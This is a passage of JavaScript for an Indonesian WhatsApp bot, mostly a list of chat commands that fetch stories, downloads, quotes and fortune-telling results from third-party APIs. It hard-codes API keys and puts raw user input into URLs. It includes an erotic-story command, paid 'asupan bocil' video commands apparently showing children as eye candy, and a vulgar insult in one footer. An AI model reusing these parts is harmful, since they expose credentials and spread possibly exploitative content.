*▢ Deskripsi :* ${anu.data.result.cerpen}`)
limitAdd(sender, limit)
}
break
case 'cersex':
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let an = await fetchJson(`https://docs-jojo.herokuapp.com/api/cersex`)
textImg(`➻ *Judul* : ${an.result.judul}

➻ *Nama* : ${an.result.cersex}

*By Surya~*`)
limitAdd(sender, limit)
break

case 'mangaa':{
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
await getBuffer('https://api.jikan.moe/v4/manga/')
.then((res) => {
let txt = `*Manga Info*\n\n*Judul:* *${res.data.title}*\n*English:* *${res.data.title_english}*\n*Japanese:* *${res.data.title_japanese}*\n*Total Chapter:* *${res.data.chapters}*\n*Total Volume:* *${res.data.volumes}*\n*Status Manga:* *${res.data.status}*\n*Ongoing:* *${res.data.publishing ? 'Ya' : 'Tidak'}*\n*Published:* *${res.data.published.string}*\n*Score:* *${res.data.scored}*\n*Rank Manga:* *${res.data.rank}*\n*Author:* *${res.data.authors[0].name}*\n*Serial:* *${res.data.serializations[0].name}*\n*Genre:* `
for (let x of res.data.genres) {
txt += `${x.name},`
}
txt += `\n\n${res.data.synopsis}\n\nInfo Lebih Lanjut Silahkan Klik ${res.data.url}`
sendFileFromUrl(from, res.data.images.jpg.image_url, monospace(`${txt}`), msg)
})
}
 break

case 'cerpen2':
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let sur = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)
textImg(`➻ *Judul* : ${sur.result.title}
➻ *Pengarang* : ${sur.result.pengarang}
➻ *Kategori* : ${sur.result.kategori}
➻ *Cerpen* : ${sur.result.cerpen}`)
limitAdd(sender, limit)
break
case 'tongue':
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let sur1 = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
textImg(`➻ *Nih yank* : ${sur1.result}`)
limitAdd(sender, limit)
break
case 'jsholat':
if (args.length < 1) return textImg(`Contoh : *${prefix}${command} makassar*`)
if (!q) return textImg(`Penggunaan *${prefix}jsholat Jakarta*`)
let sur2 = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwalshalat?daerah=${q}`)
textImg(`*Jadwal Sholat ${q}*

➻ *Imsak* : ${sur2.Imsyak}
➻ *Subuh* : ${sur2.Subuh}
➻ *Dhuha* : ${sur2.Dhuha}
➻ *Dzuhur* : ${sur2.Dzuhur}
➻ *Ashar* : ${sur2.Ashar}
➻ *Maghrib* : ${sur2.Maghrib}
➻ *Isya* : ${sur2.Isya}`)
limitAdd(sender, limit)
break
case 'pantun2':
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let sur3 = await fetchJson(`https://docs-jojo.herokuapp.com/api/random_pantun`)
//textImg(`➻ *PANTUN* : ${sur3.result}`)
const buttonspan = [{buttonId: 'pantun2', buttonText: {displayText: 'NEXT ➡️'}, type: 1}]
const tunMessage = {
contentText: `${sur3.result}`,
footerText: `Dua tiga tutup botol\nMuka lu kayak kontol\n@${Suryaa.split('@')[0]}`,
buttons: buttonspan,
headerType: 1
}

surya.sendMessage(from, tunMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break 

case 'namaninja2':
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 1) return textImg(`Penggunaan *${command} surya*`)
if (!q) return reply (`Penggunaan *${command} surya*`)
let sur5 = await fetchJson(`https://docs-jojo.herokuapp.com/api/ninja_name?name=${q}`)
textImg(`➻ *Nama* : ${sur5.your_name}
➻ *Nama ninja* : ${sur5.result}`)
limitAdd(sender, limit)
break
case 'jarak':{
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
let anu = await axios.get(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${lolkey}&kota1=${q.split("|")[0]}&kota2=${q.split("|")[1]}`)
textImg(`*▢ Dari :* ${anu.data.result.from.name}
*▢ Ke :* ${anu.data.result.to.name}

*▢ Jarak :* ${anu.data.result.jarak}
*▢ Kereta Api :* ${anu.data.result.kereta_api}
*▢ Pesawat :* ${anu.data.result.pesawat}
*▢ Mobil :* ${anu.data.result.mobil}
*▢ Motor :* ${anu.data.result.motor}
*▢ Jalan Kaki :* ${anu.data.result.jalan_kaki}`)
limitAdd(sender, limit)
}
break
case 'cerhor':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
sendFileFromUrl(from, anu.data.result.thumbnail, monospace(`▢ Judul : ${anu.data.result.title}

▢ Deskripsi : ${anu.data.result.desc}`), msg)
limitAdd(sender, limit)
}
break
case 'otakdesu':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${q}`)
textImg(`*▢ Title :* ${anu.data.result.title}

*▢ Japanese :* ${anu.data.result.japanese}

*▢ judul :* ${anu.data.result.judul}

*▢ Episodes :* ${anu.data.result.episodes}

*▢ Aired :* ${anu.data.result.aired}

*▢ Producers :* ${anu.data.result.producers}

*▢ Genres :* ${anu.data.result.genres}

*▢ Duration :* ${anu.data.result.duration}

*▢ Studios :* ${anu.data.result.studios}

*▢ Rating :* ${anu.data.result.rating}

*▢ Credit :* ${anu.data.result.credit}

*▢ Reso :* ${anu.data.result.reso}

*▢ Size :* ${anu.data.result.size}

*▢ Link download :* ${anu.data.result.link_dl.zippyshare}`)
limitAdd(sender, limit)
}
break

case 'quotesyt': case 'ytquotes':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
let getqyt = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=ItsMeKo`)
let qyts = `Nyesek ngab:)`
let sqyt = await surya.prepareMessage(from, getqyt, image, {thumbnail: suryaImg})
const quotesyt = [{buttonId: 'quotesyt', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const qytMessage = {
imageMessage: sqyt.message.imageMessage,
contentText: qyts,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: quotesyt,
headerType: 4
}

surya.sendMessage(from, qytMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
}
break

case 'storyanime': case 'sanime':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
Flink(mess.wait)
let getsanime = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=ItsMeKo`)
let kodi = `*DASAR WIBU:V*`
let snime = await surya.prepareMessage(from, getsanime, video, {thumbnail: suryaImg})
const sanime = [{buttonId: 'sanime', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const sanimeMessage = {
videoMessage: snime.message.videoMessage,
contentText: kodi,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: sanime,
headerType: 5
}

surya.sendMessage(from, sanimeMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
}
break

case 'tts':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return reply(`Penggunaan :\n*${prefix}tts* kodebahasa teks\n*${prefix}tts* kodebahasa <reply message>`)
if (isQuotedMsg){
let rano = getRandom('.ogg')
let ranm = getRandom('.mp3')
let bahasanya = args[1].toString()
if (!listbahasa.isSupported(bahasanya)) {
let ini_txt = `Maaf, Bahasa ${bahasanya} Tidak Terdaftar.\n\nList Bahasa:\n`
for (var x in listbahasa) {
ini_txt += `${x} - ${listbahasa[x]}\n`
}
textImg(ini_txt)
}
const ptt = await tts(bahasanya)
ptt.save(ranm, quotedMsg.chats, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
if (err) return reply('𝗬𝗲𝗮𝗵 𝗴𝗮𝗴𝗮𝗹 ;(, 𝘂𝗹𝗮𝗻𝗴𝗶 𝗹𝗮𝗴𝗶 𝘆𝗮𝗵 𝘁𝗼𝗱 ^_^')
surya.sendMessage(from, fs.readFileSync(rano), audio, { quoted: msg, ptt: true })
fs.unlinkSync(rano)
limitAdd(sender, limit)
})
})
.catch(() => reply(mess.error.api))
} else {
if (args.length < 3) return reply(`Penggunaan :\n*${prefix}tts* kodebahasa teks\n*${prefix}tts* kodebahasa <reply message>`)
let rano = getRandom('.ogg')
let ranm = getRandom('.mp3')
let bahasanya = args[1].toString()
if (!listbahasa.isSupported(bahasanya)) {
let ini_txt = `Maaf, Bahasa ${bahasanya} Tidak Terdaftar.\n\nList Bahasa:\n`
for (var x in listbahasa) {
ini_txt += `${x} - ${listbahasa[x]}\n`
}
textImg(ini_txt)
}
let textnya = q.slice(args[1].length + 1, q.length)
const ptt = await tts(bahasanya)
ptt.save(ranm, textnya, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
if (err) return reply('𝗬𝗲𝗮𝗵 𝗴𝗮𝗴𝗮𝗹 :( 𝘂𝗹𝗮𝗻𝗴𝗶 𝗹𝗮𝗴𝗶 𝘆𝗮𝗵 𝘁𝗼𝗱 ^_^')
surya.sendMessage(from, fs.readFileSync(rano), audio, { quoted: msg, ptt: true })
fs.unlinkSync(rano)
limitAdd(sender, limit)
})
})
.catch(() => reply(mess.error.api))
}
break
case 'ttaudio':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let ttm = await axios.get(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=YAUDAH%20IYA&url=${q}`)
sendFileFromUrl(from, ttm, audio, msg)
limitAdd(sender, limit)
}
break
case 'tiktokaudio': case 'tiktokmusic': case 'ttdlmp3':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply('Linknya mana?')
if (!q.includes('tiktok')) return reply(mess.error.Iv)
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let ttv = await axios.get(`https://api.lolhuman.xyz/api/tiktok3?apikey=YAUDAH%20IYA&url=${q}`)
sendFileFromUrl(from, ttv.data.result, msg)
gameAdd(sender, glimit)
}
break
/*case 'tiktokvideo': case 'ttdlmp4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply('Linknya mana?')
if (!q.includes('tiktok')) return reply(mess.error.Iv)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
let data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${q}`)
let ini_video = await getBuffer(data.result.link)
let capt = `
┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ TIKTOK NOWM DOWNLOADER
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Title : ${data.result.title}\`\`\`
\`\`\`▢ Tipe : MP4\`\`\`
\`\`\`▢ Username : ${data.result.author.username} / ${data.result.author.nickname}\`\`\`
\`\`\`▢ Duration : ${data.result.duration}\`\`\`
\`\`\`▢ LikeCount : ${data.result.statistic.diggCount}\`\`\`
\`\`\`▢ ShareCount : ${data.result.statistic.shareCount}\`\`\`
\`\`\`▢ CommentCount : ${data.result.statistic.commentCount}\`\`\`
\`\`\`▢ PlayCount : ${data.result.statistic.playCount}\`\`\`

${S}▢ Descripttion : ${data.result.description}${S}`
surya.sendMessage(from, ini_video, video, { quoted: msg, caption: capt })
gameAdd(sender, glimit)
}
break*/
case 'ytmp4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply('Linknya?')
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
let data = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo?apikey=YAUDAH%20IYA&url=${q}`)
let inivideo = await getBuffer(data.result.link.link)
let capt = `
┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ YOUTUBE MP4
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Title : ${data.result.title}\`\`\`
\`\`\`▢ Tipe : MP4\`\`\`
\`\`\`▢ View : ${data.result.view}\`\`\`
\`\`\`▢ Duration : ${data.result.duration}\`\`\`
\`\`\`▢ Like : ${data.result.like}\`\`\`
\`\`\`▢ Dislike : ${data.result.dislike}\`\`\`
\`\`\`▢ Channel : ${data.result.channel}\`\`\`
\`\`\`▢ Uploader : ${data.result.uploader}\`\`\`

${S}▢ Deskripsi : ${data.result.description}${S}`
surya.sendMessage(from, inivideo, video, { quoted: msg, caption: capt })
gameAdd(sender, glimit)
}
break
case 'quotemaker':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan *${command}* quote|author`)
if (!q.includes("|")) return textImg(`Penggunaan *${command}* quote|author`)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/quotemaker2?apikey=${lolkey}&text=${q.split("|")[0]}&author=${q.split("|")[1]}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
}
break
case 'quoteskanye':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let anu = await axios.get(`https://docs-muzhha.herokuapp.com/api/quotes/kanye?apikey=muzhabot`)
textImg(`*Quotes Kanye :*
${anu.data.result.text_id}

${anu.data.result.text_en}`)
gameAdd(sender, glimit)
}
break
case 'brainly':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let brien = body.slice(8)
brainly(`${brien}`).then(res => {
let teks = `─────────────────────\n`
for (let Y of res.data) {
teks += `
*「 BRAINLY 」*

*➸ Pertanyaan:* ${Y.pertanyaan}

*➸ Jawaban:* ${Y.jawaban[0].text}
\n*Brainly By Mecha Botz Surya*`
}
surya.sendMessage(from, teks, text, msg)
console.log(res)
})
gameAdd(sender, glimit)
break
case 'transformer':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://docs-muzhha.herokuapp.com/api/maker/special/transformer?text=${q}&apikey=muzhabot`)
sendFileFromUrl(from, anu.data.result.results, monospace(`Nih kak`), msg)
limitAdd(sender, limit)
}
break

case 'asupanlist': case 'listasupan': case 'asupan':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let timnya = moment(msg.messageTimestamp * 1000).format('HH:mm:ss')
const listAsupan = {
buttonText: '𝐊𝐥𝐢𝐤 𝐃𝐢𝐬𝐢𝐧𝐢 ︎🌹',
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
description: `Hai @${sender.split('@')[0]}, ${Ucapan}\n\n${sholat}\nSilahkan pilih salah satu asupan dibawah 🌹\n`,
sections: [
{
"title": `${timnya} - ${tampilBulan}`,
rows: [
{
"title": "Asupan Bocil",
description: `\nClick untuk menampilkan asupan bocil`,
"rowId": `${prefix}asupanbocil`
},
{
"title": "Asupan Ghea",
description: `\nClick untuk menampilkan asupan ghea`,
"rowId": `${prefix}asupanghea`
},
{
"title": "Asupan +62",
description: `\nClick untuk menampilkan asupan Indonesia`,
"rowId": `${prefix}asupan+62`
},
{
"title": "Asupan Santuy",
description: `\nClick untuk menampilkan asupan santuy`,
"rowId": `${prefix}asupansantuy`
},
{
"title": "Asupan Ukhty",
description: `\nClick untuk menampilkan asupan ukhty`,
"rowId": `${prefix}asupanukhty`
},
{
"title": "Asupan Rika Agusriani",
description: `\nClick untuk menampilkan asupan rika agusriani`,
"rowId": `${prefix}asupanrikagusriani`
}
]
}],
listType: 1
}
surya.sendMessage(from, listAsupan, MessageType.listMessage, {contextInfo: { mentionedJid: [sender, Suryaa, '0@s.whatsapp.net']}, quoted:msg})
break

case 'asubocil': case 'asupanbocil':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let bocil = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=ItsMeKo`)
surya.sendMessage(from, bocil, video, {quoted:msg})
limitAdd(sender, limit)
}
break
case 'asughea': case 'asupanghea':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let bocil = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=ItsMeKo`)
surya.sendMessage(from, bocil, video, {quoted:msg})
limitAdd(sender, limit)
}
break
case 'asu+62': case 'asupan+62':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let bocil = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupan?apikey=ItsMeKo`)
surya.sendMessage(from, bocil, video, {quoted:msg})
limitAdd(sender, limit)
}
break
case 'asusantuy': case 'asupansantuy':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let bocil = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=ItsMeKo`)
surya.sendMessage(from, bocil, video, {quoted:msg})
limitAdd(sender, limit)
}
break
case 'asuukhty': case 'asupanukhty':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let bocil = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=ItsMeKo`)
surya.sendMessage(from, bocil, video, {quoted:msg})
limitAdd(sender, limit)
}
break
case 'rikagusriani': case 'asupanrikagusriani':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let bocil = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=ItsMeKo`)
surya.sendMessage(from, bocil, video, {quoted:msg})
limitAdd(sender, limit)
}
break

case 'weton':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan :
}*${prefix}weton* tanggal/bulan/tahun

Contoh : ${command} 11/11/2011`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/weton/${q}?apikey=${lolkey}`)
textImg(`*▢ Weton :* ${anu.data.result.weton}
*▢ Karakter :* ${anu.data.result.karakter}
*▢ Pekerjaan :* ${anu.data.result.pekerjaan}
*▢ Rejeki :* ${anu.data.result.rejeki}
*▢ Jodoh :* ${anu.data.result.jodoh}`)
limitAdd(sender, limit)
}
break
case 'jodoh':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan :
*${prefix}jodoh* namamu/nama pacarmu

Contoh : ${command} surya/mine`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/jodoh/${q}?apikey=${lolkey}`)
sendFileFromUrl(from, anu.data.result.image, monospace(`▢ Positif : ${anu.data.result.positif}
▢ Negatif : ${anu.data.result.negatif}
▢ Deskripsi : ${anu.data.result.deskripsi}`), msg)
limitAdd(sender, limit)
}
break
case 'faktaunik':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/faktaunik?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'artinama':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan :
*${prefix}artinama* Nama

Contoh : ${command} Jabal surya ngalam`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/artinama?apikey=${lolkey}&nama=${q}`)
textImg(`*▢ Arti nama ${q}*
*▢ Deskripsi :* ${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'tebakumur':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan :
*${prefix}tebakumur* Nama : ${command} Jabal Surya Ngalam`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebakumur?apikey=${lolkey}&name=${q}`)
